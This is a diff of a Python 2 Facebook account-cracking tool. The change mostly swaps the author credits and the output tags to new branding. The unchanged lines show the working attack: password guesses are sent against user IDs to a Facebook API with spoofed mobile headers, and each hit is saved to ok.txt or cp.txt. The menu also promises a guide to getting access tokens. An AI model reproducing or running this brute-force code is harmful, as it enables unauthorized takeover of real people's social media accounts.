@@ -1,9 +1,9 @@
 #!/usr/bin/python2
 # -*- coding: utf-8
 
-#AUTHOR : Cyber ALAMiN (Cyber Psycho)
+#AUTHOR : CYBER HACKER PSYCHO PICCHI
 #OPEN SOURCE :)
-#DON'T FORGET TO GIVE CREDIT TO Cyber ALAMiN
+#DON'T FORGET TO GIVE CREDIT TO PSYCHO PICCHI
 
 
 try:
@@ -43,17 +43,17 @@ loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 
 def linex():
 	os.system('echo  "\n ======================================\n" | lolcat -a -d 2 -s 50')
 def logo():
-	os.system('echo "\n  \033[0;93m ____  __  ___  ___  _  _  __ \n   \033[0;93m(  _ \(  )/ __)/ __)/ )( \(  ) \n  \033[0;96m ) __/ )(( (__( (__ ) __ ( )( \n  \033[0;96m(__)  (__)\___)\___)\_)(_/(__)\n  \033[0;93m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n  \033[0;91mAUTHOR   : PSYCHO PICCHI\n  \033[0;93mFACEBOOK : PSYCHO PICCHI\n  \033[0;96mGITHUB   : PSYCHO-PICCHI\n  \033[0;95mTOOLS    : FILE CLONING / DUMP\n   \033[0;96m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n " | lolcat -a -d 2 -s 50')	
+	os.system('echo "\n  \033[0;93m ____  __  ___  ___  _  _  __ \n   \033[0;93m(  _ \(  )/ __)/ __)/ )( \(  ) \n  \033[0;96m ) __/ )(( (__( (__ ) __ ( )( \n  \033[0;96m(__)  (__)\___)\___)\_)(_/(__)\n  \033[0;93m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n  \033[0;91mAUTHOR   : PSYCHO PICCHI\n  \033[0;93mFACEBOOK : PSYCHO PICCHI\n  \033[0;96mGITHUB   : PSYCHO-PICCHI\n  \033[0;95mTOOLS    : FILE CLONING / DUMP\n  \033[0;96m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n " | lolcat -a -d 2 -s 50')	
 
 def main():
 	os.system("clear")
 	logo()
-	print("\t\033[93;1m      MAIN MENU\x1b[0m")
+	print("\t\033[93;1m  MAIN MENU\x1b[0m")
 	print("")
-	print("\033[92;1m  [01] START Cyber CRACK")
+	print("\033[92;1m  [01] START CRACK")
 	print("\033[93;1m  [02] HOW TO GET ACCESS TOKEN")
-	print("\033[94;1m  [03] UPDATE Cyber TOOL")
-	print("\033[96;1m  [04] JOIN Cyber Termux Zone GROUP")
+	print("\033[94;1m  [03] UPDATE TOOL")
+	print("\033[96;1m  [04] JOIN MY PAGE")
 	print("\033[90;1m  [00] EXIT")
 	print("")
 	log_sel()
@@ -553,14 +553,14 @@ def crack_select():
 			headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 			data = requests.get(api, params=params, headers=headers_)
 			if "access_token" in data.text and "EAAA" in data.text:
-				print(" \033[1;32m[Cyber-OK] "+uid+" | "+pass1+"\033[0;97m")
+				print(" \033[1;32m[PSYCHO-OK] "+uid+" | "+pass1+"\033[0;97m")
 				ok = open("ok.txt", "a")
 				ok.write(uid+"|"+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in data.json()['error_msg']:
-					print(" \033[1;33m[Cyber-CP] "+uid+" | "+pass1+"\033[0;97m")
+					print(" \033[1;33m[PICCHI-CP] "+uid+" | "+pass1+"\033[0;97m")
 					cp = open("cp.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
@@ -572,14 +572,14 @@ def crack_select():
 					headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 					data = requests.get(api, params=params, headers=headers_)
 					if "access_token" in data.text and "EAAA" in data.text:
-						print(" \033[1;32m[Cyber-OK] "+uid+" | "+pass2+"\033[0;97m")
+						print(" \033[1;32m[PSYCHO-OK] "+uid+" | "+pass2+"\033[0;97m")
 						ok = open("ok.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in data.json()['error_msg']:
-							print(" \033[1;33m[Cyber-CP] "+uid+" | "+pass2+"\033[0;97m")
+							print(" \033[1;33m[PICCHI-CP] "+uid+" | "+pass2+"\033[0;97m")
 							cp = open("cp.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
 							cp.close()
@@ -591,14 +591,14 @@ def crack_select():
 							headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 							data = requests.get(api, params=params, headers=headers_)
 							if "access_token" in data.text and "EAAA" in data.text:
-								print(" \033[1;32m[Cyber-OK] "+uid+" | "+pass3+"\033[0;97m")
+								print(" \033[1;32m[PSYCHO-OK] "+uid+" | "+pass3+"\033[0;97m")
 								ok = open("ok.txt", "a")
 								ok.write(uid+"|"+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in data.json()['error_msg']:
-									print(" \033[1;33m[Cyber-CP] "+uid+" | "+pass3+"\033[0;97m")
+									print(" \033[1;33m[PICCHI-CP] "+uid+" | "+pass3+"\033[0;97m")
 									cp = open("cp.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
 									cp.close()
@@ -610,14 +610,14 @@ def crack_select():
 									headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 									data = requests.get(api, params=params, headers=headers_)
 									if "access_token" in data.text and "EAAA" in data.text:
-										print(" \033[1;32m[Cyber-OK] "+uid+" | "+pass4+"\033[0;97m")
+										print(" \033[1;32m[PSYCHO-OK] "+uid+" | "+pass4+"\033[0;97m")
 										ok = open("ok.txt", "a")
 										ok.write(uid+"|"+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in data.json()['error_msg']:
-											print(" \033[1;33m[Cyber-CP] "+uid+" | "+pass4+"\033[0;97m")
+											print(" \033[1;33m[PICCHI-CP] "+uid+" | "+pass4+"\033[0;97m")
 											cp = open("cp.txt", "a")
 											cp.write(uid+"|"+pass4+"\n")
 											cp.close()
@@ -629,14 +629,14 @@ def crack_select():
 											headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 											data = requests.get(api, params=params, headers=headers_)
 											if "access_token" in data.text and "EAAA" in data.text:
-												print(" \033[1;32m[Cyber-OK] "+uid+" | "+pass5+"\033[0;97m")
+												print(" \033[1;32m[PSYCHO-OK] "+uid+" | "+pass5+"\033[0;97m")
 												ok = open("ok.txt", "a")
 												ok.write(uid+"|"+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in data.json()['error_msg']:
-													print(" \033[1;33m[Cyber-CP] "+uid+" | "+pass5+"\033[0;97m")
+													print(" \033[1;33m[PICCHI-CP] "+uid+" | "+pass5+"\033[0;97m")
 													cp = open("cp.txt", "a")
 													cp.write(uid+"|"+pass5+"\n")
 													cp.close()
@@ -648,14 +648,14 @@ def crack_select():
 													headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 													data = requests.get(api, params=params, headers=headers_)
 													if "access_token" in data.text and "EAAA" in data.text:
-														print(" \033[1;32m[Cyber-OK] "+uid+" | "+pass6+"\033[0;97m")
+														print(" \033[1;32m[PSYCHO-OK] "+uid+" | "+pass6+"\033[0;97m")
 														ok = open("ok.txt", "a")
 														ok.write(uid+"|"+pass6+"\n")
 														ok.close()
 														oks.append(uid+pass6)
 													else:
 														if "www.facebook.com" in data.json()['error_msg']:
-															print(" \033[1;33m[Cyber-CP] "+uid+" | "+pass6+"\033[0;97m")
+															print(" \033[1;33m[PICCHI-CP] "+uid+" | "+pass6+"\033[0;97m")
 															cp = open("cp.txt", "a")
 															cp.write(uid+"|"+pass6+"\n")
 															cp.close()
@@ -667,14 +667,14 @@ def crack_select():
 															headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 															data = requests.get(api, params=params, headers=headers_)
 															if "access_token" in data.text and "EAAA" in data.text:
-																print(" \033[1;32m[Cyber-OK] "+uid+" | "+pass7+"\033[0;97m")
+																print(" \033[1;32m[PSYCHO-OK] "+uid+" | "+pass7+"\033[0;97m")
 																ok = open("ok.txt", "a")
 																ok.write(uid+"|"+pass7+"\n")
 																ok.close()
 																oks.append(uid+pass7)
 															else:
 																if "www.facebook.com" in data.json()['error_msg']:
-																	print(" \033[1;33m[Cyber-CP] "+uid+" | "+pass7+"\033[0;97m")
+																	print(" \033[1;33m[PICCHI-CP] "+uid+" | "+pass7+"\033[0;97m")
 																	cp = open("cp.txt", "a")
 																	cp.write(uid+"|"+pass7+"\n")
 																	cp.close()
